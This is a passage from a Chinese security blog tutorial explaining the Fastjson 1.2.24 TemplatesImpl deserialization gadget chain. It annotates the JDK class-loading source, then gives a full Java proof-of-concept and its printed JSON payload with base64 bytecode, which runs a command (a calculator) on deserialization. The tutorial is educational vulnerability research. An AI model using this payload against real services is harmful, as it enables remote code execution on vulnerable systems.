</span></span><span style=display:flex><span>        ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IllegalAccessException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p><code>defineTransletClasses()</code> 方法代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>defineTransletClasses</span><span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>throws</span> TransformerConfigurationException <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// _bytecodes 不能为 null
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_bytecodes <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>NO_TRANSLET_CLASS_ERR</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 获取类加载器
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    TransletClassLoader loader <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>TransletClassLoader<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        AccessController<span style=color:#f92672>.</span><span style=color:#a6e22e>doPrivileged</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> PrivilegedAction<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>run</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> TransletClassLoader<span style=color:#f92672>(</span>ObjectFactory<span style=color:#f92672>.</span><span style=color:#a6e22e>findClassLoader</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 获取二维数组的长度，一个字节数组对应一个 Class 
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> classCount <span style=color:#f92672>=</span> _bytecodes<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        _class <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>classCount<span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 判断 Class 数量长度大于1就初始化一个容器用于存放 Class，对我们来说没啥用，可以忽略
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>classCount <span style=color:#f92672>&gt;</span> 1<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            _auxClasses <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Hashtable<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0<span style=color:#f92672>;</span> i <span style=color:#f92672>&lt;</span> classCount<span style=color:#f92672>;</span> i<span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 使用类加载器将字节数组加载为 Class
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> loader<span style=color:#f92672>.</span><span style=color:#a6e22e>defineClass</span><span style=color:#f92672>(</span>_bytecodes<span style=color:#f92672>[</span>i<span style=color:#f92672>]);</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 获取其父类 Class
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>final</span> Class superClass <span style=color:#f92672>=</span> _class<span style=color:#f92672>[</span>i<span style=color:#f92672>].</span><span style=color:#a6e22e>getSuperclass</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 判断当前 Class 的父类 Class 名称是否为 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>superClass<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>().</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>ABSTRACT_TRANSLET<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75715e>// 赋值 translet Class 在数组中的下标
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                _transletIndex <span style=color:#f92672>=</span> i<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75715e>// 存储 Class 名称及 Class，对我们来说没啥用，可以忽略
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                _auxClasses<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>_class<span style=color:#f92672>[</span>i<span style=color:#f92672>].</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_transletIndex <span style=color:#f92672>&lt;</span> 0<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            ErrorMsg err<span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>NO_MAIN_TRANSLET_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>ClassFormatError e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>TRANSLET_CLASS_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>LinkageError e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>到目前为止，基本的利用链我们已经搞清楚了，先让 Fastjson 在反序列化的时候将 <code>TemplatesImpl</code> 的几个关键成员变量赋值，如将 <code>_bytecodes</code> 字段赋值为我们事先准备好的字节数组，这样在 Fastjson 调用 <code>getTransletInstance</code> 的时候会接着调用 <code>defineTransletClasses</code> 方法将字节数组使用类加载器加载对 Class，完成之后会再找到 class 数组 <code>_class</code> 中 <code>AbstractTranslet</code> 的子类 Class 使用反射调用无参构造方法创建对象，而这个对象是我们可以控制的，在其构造方法中添加任意代码完成利用。</p><p>但是还有三个问题：</p><ol>
<li>如何将 Java Class 文件转换为字节？</li><li>如何将 Java Class 字节序列化为 Fastjson 可以识别的 JSON 内容？</li><li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 中我们需要操作的那几个成员变量都是以下划线为开头的，并且只有 get 方法没有 set 方法，Fastjson 要如何进行反序列化？</li></ol><p>第一个问题我们可以直接使用 IO 流将 Java Class 文件读取到字节数组中，但这样太过粗暴且不利于移植，因此我们可以使用操作 Java 字节码库 <code>javassist</code> 来获取 Class 字节数组。</p><p>第二个问题需要我们将 Class 字节数组进行 Base64 编码，Fastjson 在反序列化的时候会自动进行解码。</p><p>第三个问题需要我们在反序列化JSON字符串时指定 Fastjson 支持没有 set 方法的成员变量，因此也注定了此种方式可利用范围较小。</p><h2 id=测试>测试<a hidden class=anchor aria-hidden=true href=#测试>#</a></h2><p>在 pom.xml 中增加 <code>javassist</code> 依赖。</p><pre tabindex=0><code>&lt;dependency&gt;
    &lt;groupId&gt;org.javassist&lt;/groupId&gt;
    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
    &lt;version&gt;3.28.0-GA&lt;/version&gt;
&lt;/dependency&gt;
</code></pre><p>编写测试代码：</p><pre tabindex=0><code>import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.IOException;
import java.util.Base64;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.Map;

public class Eval2 {

    public static class EvalTransletClass extends AbstractTranslet {
        public EvalTransletClass() throws IOException {
            Runtime.getRuntime().exec(&#34;calc&#34;);
        }

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }
    }

    public static void main(String[] args) throws Exception {
        // 读取编译后的 class 文件为字节数组
        ClassPool classPool = ClassPool.getDefault();
        final CtClass ctClass = classPool.get(EvalTransletClass.class.getName());
        final byte[] bytes = ctClass.toBytecode();

        // 将 class 字节数组编码为 base64
        final String byteCode = Base64.getEncoder().encodeToString(bytes);

        // 构造 POC，这里使用 LinkedHashMap 是因为要保证顺序，@type 要放到第一位
        final Map&lt;String, Object&gt; pocMap = new LinkedHashMap&lt;&gt;();
        pocMap.put(&#34;@type&#34;, &#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;);
        pocMap.put(&#34;_bytecodes&#34;, Collections.singletonList(byteCode));
        pocMap.put(&#34;_name&#34;, &#34;守法市民小杜&#34;);
        pocMap.put(&#34;_outputProperties&#34;, new Object());
        pocMap.put(&#34;_tfactory&#34;, new Object());

        final String poc = JSON.toJSONString(pocMap);
        System.out.println(&#34;POC JSON:&#34;+poc);
        // POC JSON:{&#34;@type&#34;:&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;,&#34;_bytecodes&#34;:[&#34;yv66vgAAADQAMQoABgAhCgAiACMIACQKACIAJQcAJwcAKAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQARRXZhbFRyYW5zbGV0Q2xhc3MBAAxJbm5lckNsYXNzZXMBADJMY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyJEV2YWxUcmFuc2xldENsYXNzOwEACkV4Y2VwdGlvbnMHACkBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAqAQAQTWV0aG9kUGFyYW1ldGVycwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEACkV2YWwyLmphdmEMAAcACAcAKwwALAAtAQAEY2FsYwwALgAvBwAwAQAwY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyJEV2YWxUcmFuc2xldENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAeY24vdHlwZXNhZmUvanN2L2Zhc3Rqc29uL0V2YWwyACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAAFgAEABcADQAYAAsAAAAMAAEAAAAOAAwADwAAABAAAAAEAAEAEQABABIAEwADAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAHQALAAAAIAADAAAAAQAMAA8AAAAAAAEAFAAVAAEAAAABABYAFwACABAAAAAEAAEAGAAZAAAACQIAFAAAABYAAAABABIAGgADAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAIgALAAAAKgAEAAAAAQAMAA8AAAAAAAEAFAAVAAEAAAABABsAHAACAAAAAQAdAB4AAwAQAAAABAABABgAGQAAAA0DABQAAAAbAAAAHQAAAAIAHwAAAAIAIAAOAAAACgABAAUAJgANAAk=&#34;],&#34;_name&#34;:&#34;守法市民小杜&#34;,&#34;_outputProperties&#34;:{}}

        // 反序列化为 Java 对象
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
</code></pre><p>运行之后将会看到弹出了计算器。</p><h2 id=注>注<a hidden class=anchor aria-hidden=true href=#注>#</a></h2><p>文中测试使用系统和工具版本如下：</p><ul>
<li><strong>操作系统</strong> windows 10 20H2</li><li><strong>jdk</strong> java 1.8.0_301</li><li><strong>fastjson</strong> 1.2.24</li><li><strong>javassist</strong> 3.28.0-GA</li><li><strong>代码仓库</strong> <a href=https://github.com/dushixiang/java-serialization-vulnerability>https://github.com/dushixiang/java-serialization-vulnerability</a></li></ul><h2 id=其他>其他<a hidden class=anchor aria-hidden=true href=#其他>#</a></h2><p>此种方式可利用范围较小，但在高版本JDK上依然可以利用成功。</p><p>常见的 Fastjson 漏洞利用还有 RMI/JNDI 和 LDAP，但在高版本的JDK中，Java官方觉得请求远程地址上的类是一个很危险的操作，所以在最新的JDK中默认关闭了这个功能，我们在后面也会详细介绍。</p></div><footer class=post-footer>
<ul class=post-tags>
<li><a href=https://typesafe.cn/tags/java/>Java</a></li><li><a href=https://typesafe.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>反序列化</a></li><li><a href=https://typesafe.cn/tags/fastjson/>fastjson</a></li></ul><nav class=paginav>
<a class=prev href=https://typesafe.cn/posts/java-serialization-vulnerability-4/>
<span class=title>« 上一页</span>
<br>
<span>Java 反序列化漏洞原理（四）JNDI + RMI/LDAP 在fastjson中的利用原理</span>
</a>
<a class=next href=https://typesafe.cn/posts/java-serialization-vulnerability-2/>
<span class=title>下一页 »</span>
<br>
<span>Java 反序列化漏洞原理（二）新版本JDK利用方式和Shiro举例</span>
</a>
</nav><div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理 on twitter" href="https://twitter.com/intent/tweet/?text=Java%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%ef%bc%88%e4%b8%89%ef%bc%89fastjson%201.2.24%20Templateslmpl%20%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86&url=https%3a%2f%2ftypesafe.cn%2fposts%2fjava-serialization-vulnerability-3%2f&hashtags=Java%2c%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%2cfastjson"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ftypesafe.cn%2fposts%2fjava-serialization-vulnerability-3%2f&title=Java%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%ef%bc%88%e4%b8%89%ef%bc%89fastjson%201.2.24%20Templateslmpl%20%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86&summary=Java%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%ef%bc%88%e4%b8%89%ef%bc%89fastjson%201.2.24%20Templateslmpl%20%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86&source=https%3a%2f%2ftypesafe.cn%2fposts%2fjava-serialization-vulnerability-3%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ftypesafe.cn%2fposts%2fjava-serialization-vulnerability-3%2f&title=Java%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%ef%bc%88%e4%b8%89%ef%bc%89fastjson%201.2.24%20Templateslmpl%20%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ftypesafe.cn%2fposts%2fjava-serialization-vulnerability-3%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理 on whatsapp" href="https://api.whatsapp.com/send?text=Java%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%ef%bc%88%e4%b8%89%ef%bc%89fastjson%201.2.24%20Templateslmpl%20%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86%20-%20https%3a%2f%2ftypesafe.cn%2fposts%2fjava-serialization-vulnerability-3%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
